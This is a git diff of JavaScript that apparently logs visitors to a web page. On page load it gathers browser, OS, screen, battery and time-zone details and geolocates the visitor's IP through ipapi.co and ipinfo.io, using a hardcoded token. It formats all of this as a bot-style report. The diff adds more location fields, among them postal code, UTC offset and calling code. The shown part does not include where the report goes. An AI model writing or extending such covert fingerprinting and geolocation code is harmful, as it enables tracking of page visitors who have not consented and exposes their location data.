@@ -45,12 +45,6 @@ document.addEventListener('DOMContentLoaded', function() {
         batteryLevel = battery.level * 100;
     });
 
-   let systemTime = new Date();
-   let hours = systemTime.getHours();
-   let minutes = systemTime.getMinutes();
-   let formattedHours = hours < 10 ? '0' + hours : hours;
-   let formattedMinutes = minutes < 10 ? '0' + minutes : minutes;
-   let formattedTime = `${formattedHours}:${formattedMinutes}`;
     
     screenWidth = window.screen.width;
     screenHeight = window.screen.height;
@@ -75,15 +69,23 @@ fetch('https://ipapi.co/json/')
         const longitude = data.longitude;
         const time = data.timezone;
         const isp = data.org;
+        const postal = data.postal;
+        const utc = data.utc_offset;
+        const currency = data.currency;
+        const versian = data.version;
+        const tld = data.country_tld;
+        const countrycall = data.country_calling_code;
         const osname = navigator.platform;
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const browser = getBrowserInfo();
         let userid = document.createElement('p');
      
-       let systemTime = new Date();
-       let hours = systemTime.getHours();
-       let minutes = systemTime.getMinutes();
-       let formattedTime = `${hours}:${minutes}`;
+        let systemTime = new Date();
+        let hours = systemTime.getHours();
+        let minutes = systemTime.getMinutes();
+        let formattedHours = hours < 10 ? '0' + hours : hours;
+        let formattedMinutes = minutes < 10 ? '0' + minutes : minutes;
+        let formattedTime = `${formattedHours}:${formattedMinutes}`;
     
        let language = navigator.language
       
@@ -133,6 +135,12 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
     *├ Asn: ${isAsn}*
     *├ Route: ${isRoute}*
     *├ Domain: ${isDomain}*
+    *├ Postal Code: ${postal}*
+    *├ UTC: ${utc}*
+    *├ Value: ${currency}*
+    *├ Version: ${versian}*
+    *├ Country Call code: ${countrycall}*
+    *├ TLD: ${tld}*
       * System 🖥*
     *├ Browser: ${browser}*
     *├ Os: ${osname}*
